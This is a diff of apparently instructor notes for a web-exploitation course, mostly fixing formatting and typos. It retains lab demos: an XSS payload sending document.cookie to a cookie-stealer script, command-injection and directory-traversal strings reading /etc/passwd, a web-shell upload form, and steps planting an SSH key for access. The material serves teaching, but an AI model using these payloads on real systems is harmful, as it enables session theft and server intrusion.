@@ -159,9 +159,8 @@ Firefox/62.
 ```
 The corresponding reply:
 
-### HTTP/1.1 200 OK
-
 ```
+HTTP/1.1 200 OK
 Accept-Ranges: bytes
 Cache-Control: max-age=
 Content-Type: text/html; charset=UTF-
@@ -173,17 +172,14 @@ Server: ECS (atl/FCE4)
 Vary: Accept-Encoding
 X-Cache: HIT
 Content-Length: 1270
-```
-```
+
 <!doctype html>
 <html>
 <head>
 <title>Example Domain</title>
 <meta charset="utf-8" />
 <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
-```
-
-```
+Update _template_.drawio
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <style type="text/css">
 body {
@@ -363,10 +359,7 @@ as it relates to HTML DOM.
 A component of Javascript known as Asynchronous Javascript And XML (AJAX) allows a browser to
 make requests in the background of a web page after it first loads in a manner that is transparent
 to the user. This allows data exchange behind the scenes without requiring the entire page to
-reload. AJAX also allows for the implementation of asynchronous web applications built on top of
-
-
-synchronous HTTP.
+reload. AJAX also allows for the implementation of asynchronous web applications built on top of synchronous HTTP.
 
 _Note: While Java and Javascript have similar names, they are completely distinct languages._
 
@@ -513,7 +506,9 @@ activity.
 Cross-Site Scripting (XSS) is a form of attack in which untrusted Javascript is injected into a trusted
 website. This occurs when input from a user is displayed back without proper sanitization. In XSS,
 the victim is not the server itself, but the browser of a visitor. The injected Javascript executes
-within the context of the DOM of the visiting user.
+within the context of the Document Object Model (DOM) of the visiting user.
+
+![image](https://github.com/ruppertaj/WOBC/assets/93789685/a653919e-9f7a-4123-81c6-da3120b99aaa)
 
 This can be dangerous for several reasons:
 
@@ -573,10 +568,9 @@ An example of a stored XSS might be one that creates an iframe or image and adds
 background of the page. The iframe could load a URL such as "http://badguydomain.com/?" +
 document.cookie and exfiltrate all of the visitor’s cookie information.
 
-**DEMO: Stored XXS**
+**DEMO: Stored XSS**
 
-1. Utilize the message board hosted on the Demo-Web_Exploit_upload: [http://<float](http://<float)
-    ip>/chat/messageb.php
+1. Utilize the message board hosted on the Demo-Web_Exploit_upload: `http://<float ip>/chat/messageb.php`
 2. SSH into the demo-web-exploit-sql and cd into /var/www/html. This demo has a PHP script setup
     to grab cookies as they are redirected (Cookie_Stealer1.php) and writes into 'cookiefile.txt'. You
     may walk the students through the php if wanted.
@@ -593,15 +587,11 @@ fclose($steal);
     and submit.
 
 ```
- <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" +
-document.cookie;</script>
+ <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" +document.cookie;</script>
 ```
 2. Show the students in the URL how we are redirected to our Cookie_Stealer page.
-
-
-3. cat the cookiefile.txt file our demo-web-exploit-sql to show that we where able to grab cookie
-    information.
-4. To remove the stored XXS from sytem:
+3. cat the cookiefile.txt file our demo-web-exploit-sql to show that we where able to grab cookie information.
+4. To remove the stored XSS from sytem:
 
 ```
 mysql
@@ -618,14 +608,14 @@ success. However, simply triggering an alert is not very useful from an attacker
 _There are various objects that are accessible and controllable by javascript that make XSS valuable to an
 attacker:_
 
-- **Capturing Cookies** : the document.cookie object contains a string of all the cookies for the
+- **Capturing Cookies** : the `document.cookie` object contains a string of all the cookies for the
     currently loaded webpage. If an attacker can exfiltrate this object to a remote server, he or she
     may be able to masquerade as the victim.
 - **Capturing Keystrokes** : javascript allows for binding to keydown and keyup actions in order to
     log every keystroke that is pressed.
 - **Capturing sensitive data** : Essentially anything on the page itself can be captured, such as
     credit card information, passwords, or other private information. An attacker can access the
-    entire HTML source of the page in its current state with document.body.innerHTML.
+    entire HTML source of the page in its current state with `document.body.innerHTML`.
 
 Once an attacker has valuable information, he or she has to then exfiltrate the data to some
 external website or listener so it can be recovered. There are many ways to do this. A simple way
@@ -694,6 +684,7 @@ _Directory Traversal:_
           /data/uploads/../../etc/passwd becomes just /etc/passwd. Arbitrary file reads like this can
           also be used to leak the server-side source code and hunt for further vulnerabilities in other
           parts of the source code.
+- Check `../../../../../../../etc/passwd` and `../../../../../../../etc/hosts` to validate we can utilize this fully
 
 ### NOTE
 
@@ -706,11 +697,11 @@ command injection test would detect the latter.
 
 **DEMO: Directory Traversal**
 
-1. Demo-Web_Exploit_upload instance navigate to [http://<float](http://<float) IP>/path/pathdemo.php
+1. Demo-Web_Exploit_upload instance navigate to http://<float IP>/path/pathdemo.php
 2. Page is set to read files from /etc so you can lookup: passwd, profile, networks, etc
 3. Traverse to these two files ../../../../var/www/html/robots.txt and ../../../../usr/share/joe/lang/fr.po
 
-_Malicious File Upload:_
+**Malicious File Upload:**
 
 - Malicious file upload vulnerabilities exist when a user is allowed to upload files to a server in a
     way that allows an attacker to upload malicious content to the server. An example might be a
@@ -732,7 +723,7 @@ _Malicious File Upload:_
           server:
 
 ### <HTML><BODY>
-
+- mal.php
 ```
 <FORM METHOD="GET" NAME="myform" ACTION="">
 <INPUT TYPE="text" NAME="cmd">
@@ -757,9 +748,16 @@ Imagine we were using the Python framework Flask, which often tracks accessible 
 a file called views.py. We might be able to overwrite the normal views.py with our own malicious
 version that adds a URI route for command injection.
 
+- Can execute malware from `/tmp` and `/var` directories
+- Can also create ssh-key and send to server
+    - `ssh-keygen` on host
+    - `mkdir /var/www/.ssh` on server
+    - `echo "<instert ssh key>" > /var/www/.ssh/authorized_keys` on server
+    - ssh to server
+
 **DEMO: Malicious File Upload**
 
-1. Browse to the Demo-Web_Exploit_XSS instance by navigating to [http://<float](http://<float) IP>
+1. Browse to the Demo-Web_Exploit_XSS instance by navigating to http://<float IP>
 2. Create malicious file with code above and upload.
 3. Navigate to /uploads and click your file or call it directly /uploads/<evil_file>
 4. Conduct enumeration to determine how we could develop a secure shell
@@ -796,12 +794,7 @@ that remote device and watch for a successful ping.
 ```
 **Demo: Command Injection**
 
-1. Demo-Web_Exploit_upload instance navigate to [http://<float](http://<float)
-
-
-```
-IP>/cmdinjection/cmdinjectdemo.php
-```
+1. Demo-Web_Exploit_upload instance navigate to http://<float IP>/cmdinjection/cmdinjectdemo.php
 2. Ping a IP to show the page works as designed
 3. Showcase a few ways to successfully invoke command injection and perform system
     enumeration
@@ -809,8 +802,7 @@ IP>/cmdinjection/cmdinjectdemo.php
 ```
  ; whoami
  ; cat /etc/passwd
- ; ls -latr & netstat -rn
- || ifconfig
+ ; ls -latr & netstat -rn || ifconfig
 ```
 4. After enumeration, perform commands such as uploading your ssh key to gain access
 
